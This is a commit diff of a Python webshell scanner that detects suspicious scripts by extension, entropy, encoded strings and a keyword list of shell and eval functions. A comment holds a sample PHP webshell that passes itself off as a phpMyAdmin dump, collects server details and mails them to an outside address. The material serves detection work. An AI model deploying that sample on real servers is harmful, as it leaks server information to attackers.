0eff874917dc7cc222ef5341121399b723bb49ce
Lê Hải Nam (CTVIS-PATTTS-NGS-ĐT) <lehainam38@gmail.com>
2021-04-17 12:28:32 +0700

    add zip file

--- webshell_scan.py
+++ webshell_scan.py
@@ -1,19 +1,25 @@
 import argparse
-import time
-import os
+import base64
 import datetime
-import hashlib
-import sys
-import re
-import platform
 import getpass
+import gzip
+import hashlib
+import json
 import math
+import os
+import platform
+import re
+import socket
+import sys
+import tempfile
+import time
+import zipfile
 from collections import Counter
 from io import StringIO
-import gzip
-import base64
-import json
-import socket
+from zipfile import ZipFile
+
+# from smb.SMBConnection import SMBConnection
+
 
 # TESTED AND WORKED
 def GetAllFiles(dir_path):
@@ -21,18 +27,20 @@ def GetAllFiles(dir_path):
         file_list = []
         for root, dirs, files in os.walk(dir_path):
             for file in files:
-                #append the file name to the list
-                file_list.append(os.path.join(root,file))
+                # append the file name to the list
+                file_list.append(os.path.join(root, file))
         return file_list
     else:
         print("Wrong path input. Exit.")
 
 # TESTED AND WORKED
+
+
 def ScanExtension(file_name):
     # Input Sample
     #file_name = "Ajan.asp.txt"
 
-    file_matches = {} # a dict
+    file_matches = {}  # a dict
     r1 = "[^a-zA-Z0-9\-\_\.]{2,}"
     r2 = re.compile("\.[a-zA-Z0-9]{2,4}\.")
     r3 = "\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs"
@@ -50,10 +58,12 @@ def ScanExtension(file_name):
     return file_matches
 
 # TESTED AND WORKED
+
+
 def StringMatches(file_data):
     # Input Sample
-    #file_data = "<?php include(\"config.php\");db_connect();header('Content-Type: application/octetstream');header('Content-Disposition: filename=\"linksbox_v2.sql\"');$ra44 = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$sd98=\"john.barker446@gmail.com\";$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65\";mail($sd98, $sj98, $msg8873, \"From: $sd98\"); header('Pragma: no-cache');header('Expires: 0'); $data .= \"#phpMyAdmin MySQL-Dump \r\n\"; $data .=\"# http://phpwizard.net/phpMyAdmin/ \r\n\"; $data .=\"# http://www.phpmyadmin.net/(download page) \r\n\"; $data .= \"#$database v2.0 Database Backup\r\n\"; $data .= \"#Host: $server\r\n\"; $data .= \"#Database: $database\r\n\r\n\"; $data .= \"#Table add_links:\r\n\";$result = mysql_query(\"SELECT * FROM add_links\");while($a = mysql_fetch_array($result)) { foreach($a as $key => $value) { $a[$key] = addslashes($a[$key]); } $data .= \"INSERT INTO add_links VALUES('0','$a[link]', '$a[description]', '$a[tooltip]', '$a[hits]'); \r\n#endquery\r\n\"; } echo $data; ?>"
-    
+    # file_data = "<?php include(\"config.php\");db_connect();header('Content-Type: application/octetstream');header('Content-Disposition: filename=\"linksbox_v2.sql\"');$ra44 = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$sd98=\"john.barker446@gmail.com\";$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65\";mail($sd98, $sj98, $msg8873, \"From: $sd98\"); header('Pragma: no-cache');header('Expires: 0'); $data .= \"#phpMyAdmin MySQL-Dump \r\n\"; $data .=\"# http://phpwizard.net/phpMyAdmin/ \r\n\"; $data .=\"# http://www.phpmyadmin.net/(download page) \r\n\"; $data .= \"#$database v2.0 Database Backup\r\n\"; $data .= \"#Host: $server\r\n\"; $data .= \"#Database: $database\r\n\r\n\"; $data .= \"#Table add_links:\r\n\";$result = mysql_query(\"SELECT * FROM add_links\");while($a = mysql_fetch_array($result)) { foreach($a as $key => $value) { $a[$key] = addslashes($a[$key]); } $data .= \"INSERT INTO add_links VALUES('0','$a[link]', '$a[description]', '$a[tooltip]', '$a[hits]'); \r\n#endquery\r\n\"; } echo $data; ?>"
+
     file_matches = {}
     r = re.compile(regex)
     matches = re.findall(r, file_data)
@@ -63,6 +73,8 @@ def StringMatches(file_data):
     return file_matches
 
 # TESTED AND WORKED
+
+
 def EntropyMatches(file_data):
     # Input Sample
     # file_h = open("test_entropy.txt", "r")
@@ -73,7 +85,7 @@ def EntropyMatches(file_data):
     if len(file_data) < 20*1024:
         return file_matches
     file_data = file_data.replace(" ", "")
-    for i in range(256): # Scan all 256 character in ASCII
+    for i in range(256):  # Scan all 256 character in ASCII
         count = float(file_data.count(chr(i)))
         length = float(len(file_data))
         pX = count / length
@@ -84,6 +96,8 @@ def EntropyMatches(file_data):
     return file_matches
 
 # TESTED AND WORKED, BUT NOT SURE
+
+
 def CompressMatches(file_data):
     file_matches = {}
     if len(file_data) < 20*1024:
@@ -96,6 +110,8 @@ def CompressMatches(file_data):
     return file_matches
 
 # TESTED, NEARLY CORRECT =)))
+
+
 def SplitMatches(file_data):
     file_matches = {}
     s = "eval|file_put_contents|base64_decode|base64|python_eval|exec|passthru|popen|proc_open|pcntl|assert|system|shell|uncompress|cmd.exe|execute|escapeshellcmd|os.popen|/bin/sh|/bin/bash|create_function|executionpolicybypass"
@@ -123,6 +139,8 @@ def SplitMatches(file_data):
     return file_matches
 
 # TESTED AND WORKED
+
+
 def Base64Matches(file_data):
     # Correct Input Sample
     # file_h = open("test_base64.txt", "r")
@@ -136,7 +154,8 @@ def Base64Matches(file_data):
     if len(matches1) > 0:
         for it in matches1:
             s1 = re.sub(pattern=r4, string=it, repl="")
-            r = re.compile("^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
+            r = re.compile(
+                "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
             r1 = re.compile("[a-fA-F0-9]+")
             r2 = re.compile("[a-zA-Z0-9\/]+")
             matches = re.findall(r, s1)
@@ -154,6 +173,8 @@ def Base64Matches(file_data):
     return file_matches
 
 # TESTED AND WORKED
+
+
 def Base32Matches(file_data):
     file_matches = {}
     r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
@@ -163,7 +184,8 @@ def Base32Matches(file_data):
     if len(matches1) > 0:
         for it in matches1:
             s1 = re.sub(pattern=r4, string=it, repl="")
-            r = re.compile("^(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$")
+            r = re.compile(
+                "^(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$")
             r1 = re.compile("[a-fA-F0-9]+")
             r2 = re.compile("[a-zA-Z0-9\/]+")
             matches = re.findall(r, s1)
@@ -181,6 +203,8 @@ def Base32Matches(file_data):
     return file_matches
 
 # TESTED AND WORKED
+
+
 def HexStringMatches(file_data):
     file_matches = {}
     r = re.compile(r"(?:(?:\\x[0-9A-Fa-f]{2})+)")
@@ -191,6 +215,8 @@ def HexStringMatches(file_data):
     return file_matches
 
 # TESTED AND WORKED
+
+
 def LongStringMatches(file_data):
     file_matches = {}
     if len(file_data) < 20*1024:
@@ -213,19 +239,21 @@ def LongStringMatches(file_data):
     return file_matches
 
 # TESTED AND WORKED
+
+
 def ProcessMatches(file):
     # Input Sample
     # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"
 
-    total_file_matches = {} # a dictionary
-    file_matches = {} # dict
+    total_file_matches = {}  # a dictionary
+    file_matches = {}  # dict
     scan_info = ""
     count = 0
     try:
         file_handle = open(file)
     except:
         return total_file_matches, 0, ""
-    
+
     file_size = os.stat(file).st_size
     file_name = os.path.basename(file)
     # Scan Extension
@@ -243,7 +271,7 @@ def ProcessMatches(file):
 
     # CONFUSED HERE!!!!!!!!!!!
     # cmtR = "\/\/.*|\/\*.*?\*\/|[^\u0000-\u007f]+" # RANGE OF UNICODE IN PYTHON ONLY HAVE 1 \, NOT 2
-    cmtR = "[^\u0000-\u007f]+" # TEMPORARY REGEX.
+    cmtR = "[^\u0000-\u007f]+"  # TEMPORARY REGEX.
 
     matches = re.findall(pattern=cmtR, string=file_data)
     file_data = re.sub(pattern=cmtR, string=file_data, repl="")
@@ -252,7 +280,8 @@ def ProcessMatches(file):
     file_data = re.sub(pattern=cmtR, string=file_data, repl=" ")
     file_data = file_data.replace("  ", " ")
     file_data = file_data.replace(" (", "(")
-    codeR = re.compile(r"<\?php(?:.*?)\?>|<script(?:.*?)<\/script>|<%(?:.*?)%>")
+    codeR = re.compile(
+        r"<\?php(?:.*?)\?>|<script(?:.*?)<\/script>|<%(?:.*?)%>")
     matches = re.findall(pattern=codeR, string=file_data)
     if len(matches) > 0:
         file_data = ""
@@ -262,7 +291,7 @@ def ProcessMatches(file):
     else:
         return total_file_matches, 0, ""
 
-    #String Matches
+    # String Matches
     file_matches = StringMatches(file_data)
     if len(file_matches) > 0:
         total_file_matches.update(file_matches)
@@ -324,13 +353,15 @@ def ProcessMatches(file):
         total_file_matches.update(file_matches)
         scan_info = scan_info + str(len(file_matches))
         count = count + 1
-    csv_log = file + "," + scan_info.replace(" ", "")
+    match_log = file + "," + scan_info.replace(" ", "")
     if count > 0:
-        return total_file_matches, file_size, csv_log
+        return total_file_matches, file_size, match_log
     file_handle.close()
     return total_file_matches, file_size, ""
 
 # TESTED AND WORKED
+
+
 def MD5HashFile(file):
     # Input Sample
     # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"
@@ -340,21 +371,11 @@ def MD5HashFile(file):
     result = hashlib.md5(file_data).hexdigest()
     return result
 
-# TESTED BUT NOT SURE
-def CompressEncode(file, size):
-    # Input Sample
-    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"
 
-    file_handle = open(file, "rb")
-    file_data = file_handle.read()
-    compressed = gzip.compress(bytes(file_data))
-    img_base64 = base64.b64encode(compressed)
-    return img_base64
-
-def ScanFunc(file_list, output_dir, scan_dir, raw, pnl, start_time):
+def ScanFunc(file_list, output_dir, scan_dir, pnl, start_time):
     matched = 0
     cleared = 0
-    logcsv = "PathName,FakeName,String,Entropy,Compress,Split,Base64,Base32,HexString,LongString,Size,MD5,Created,Modified,Accessed\n"
+    csv_log = "PathName,FakeName,String,Entropy,Compress,Split,Base64,Base32,HexString,LongString,Size,MD5,Created,Modified,Accessed\n"
     totalFilesScanned = 0
     user_name = getpass.getuser()
     homedir = os.path.expanduser("~")
@@ -364,11 +385,11 @@ def ScanFunc(file_list, output_dir, scan_dir, raw, pnl, start_time):
     for file in file_list:
         # Sample
         # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"
-        
+
         print(file)
         totalFilesScanned = totalFilesScanned + 1
         # Process Matches
-        file_matches, size, csvlog = ProcessMatches(file)
+        file_matches, size, match_log = ProcessMatches(file)
 
         if (len(file_matches) > 0 and size > 0):
             matched = matched + 1
@@ -388,24 +409,23 @@ def ScanFunc(file_list, output_dir, scan_dir, raw, pnl, start_time):
             if file_hash in pnl_content:
                 print("Already scan")
                 continue
-        # CompressEncode
-        raw = CompressEncode(file, size)
         # Get created time
         if platform.system() == 'Windows':
             create_time = os.path.getctime(file)
-            create_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(create_time))
+            create_time = time.strftime(
+                '%Y-%m-%d %H:%M:%S', time.localtime(create_time))
             modify_time = os.path.getmtime(file)
-            modify_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
+            modify_time = time.strftime(
+                '%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
             access_time = os.path.getatime(file)
-            access_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(access_time))
-        else: # NOT TESTED
+            access_time = time.strftime(
+                '%Y-%m-%d %H:%M:%S', time.localtime(access_time))
+        else:  # NOT TESTED
             stat = os.stat(file)
-            create_time = stat.st_ctime # We're probably on Linux.
+            create_time = stat.st_ctime  # We're probably on Linux.
             modify_time = stat.st_mtime
             access_time = stat.st_atime
-        # Append output to logcsv
-        logcsv = logcsv + csvlog + "," + str(size) + "," + file_hash + "," + create_time + "," + modify_time + "," + access_time + "\n"
-        
+
         # JSON output
         json_data = {}
         json_data.update({"filePath": file})
@@ -417,18 +437,11 @@ def ScanFunc(file_list, output_dir, scan_dir, raw, pnl, start_time):
         timestamps.update({"accessed": access_time})
         json_data.update({"timestamps": timestamps})
         json_data.update({"matches": file_matches})
-        json_data.update({"rawContents": str(raw)})
         json_data_string = json.dumps(json_data)
         output_json_path = output_dir + "/log.json"
         output_json_handle = open(output_json_path, "a")
         output_json_handle.write(json_data_string + "\n")
         output_json_handle.close()
-    
-    # Write to log.csv
-    output_csv_path = output_dir + "/log.csv"
-    output_csv_handle = open(output_csv_path, "wb")
-    output_csv_handle.write(logcsv.encode())
-    output_csv_handle.close()
 
     # Append scan info to json
     stop_time = time.time()
@@ -456,15 +469,17 @@ start_time = time.time()
 
 parser = argparse.ArgumentParser(description='Webshell Scan Program')
 
-parser.add_argument('-r', '--regex', help='Override default regex with your own', default="")
+parser.add_argument(
+    '-r', '--regex', help='Override default regex with your own', default="")
 
-parser.add_argument('-s', '--size', help='Specify max file size to scan (default is 10 MB)', default=10)
+parser.add_argument(
+    '-s', '--size', help='Specify max file size to scan (default is 10 MB)', default=10)
 
-parser.add_argument('-e', '--ext', help='Specify extensions to target. Multiple extensions should be passed with pipe separator (asp|aspx|php|cfm). Default is all extensions', default='\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs|\.ps1|\.war|\.js|\.jar')
+parser.add_argument('-e', '--ext', help='Specify extensions to target. Multiple extensions should be passed with pipe separator (asp|aspx|php|cfm). Default is all extensions',
+                    default='\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs|\.ps1|\.war|\.js|\.jar')
 
-parser.add_argument('--raw', help='If a match is found, grab the raw contents and base64 + gzip compress the file into the JSON object.', default=True)
-
-parser.add_argument('-t', '--time', help='Scan all file created or modified after this time <yyyy-mm-dd>', default='2000-01-01')
+parser.add_argument(
+    '-t', '--time', help='Scan all file created or modified after this time <yyyy-mm-dd>', default='2000-01-01')
 
 parser.add_argument('-p', '--pnl', help='Scan for PnL', default="")
 
@@ -472,12 +487,11 @@ parser.add_argument('dir', help='Directory to scan for webshells')
 
 args = parser.parse_args()
 param = vars(args)
-# list param: regex, size, ext, raw, time, pnl, dir. len=7
+# list param: regex, size, ext, time, pnl, dir. len=7
 scan_dir = param.get('dir')
 regex = param.get('regex')
 size = param.get('size')
 ext = param.get('ext')
-raw = param.get('raw')
 time_scan = param.get('time')
 pnl = param.get('pnl')
 
@@ -491,19 +505,30 @@ file_list = GetAllFiles(scan_dir)
 # Check valid regex and ext
 try:
     re.compile(param.get('ext'))
-    #re.compile(param.get('regex')) # WHY FAILED?
+    # re.compile(param.get('regex')) # WHY FAILED?
 except:
     print('Non valid regex input. Exit')
     exit()
 
-# Get platform
+# Define output
 os_name = platform.node()
-# Get user name
 user_name = getpass.getuser()
+domain_name = socket.getfqdn()
+ip_addr = socket.gethostbyname(socket.gethostname())
+scan_time = str(datetime.datetime.today().strftime('%Y-%m-%d-%H-%M'))
 
-output_dir = os_name + "_" + str(datetime.datetime.today().strftime('%Y-%m-%d-%H-%M'))
+output_dir = os_name + "_" + scan_time
 os.mkdir(output_dir)
+output_zip = domain_name + "_" + ip_addr + "_" + \
+    os.path.basename(scan_dir) + "_" + scan_time + ".zip"
 
 # ScanFunc
-ScanFunc(file_list, output_dir, scan_dir, raw, pnl, start_time)
+ScanFunc(file_list, output_dir, scan_dir, pnl, start_time)
+
+# Zip JSON output
+with ZipFile(output_dir + "\\" + output_zip, 'w', compression=zipfile.ZIP_DEFLATED) as zip:
+    zip.write(output_dir + "/log.json",
+              os.path.basename(output_dir + "/log.json"))
+              
+print("File zip successful.")
 print("Scan done!")
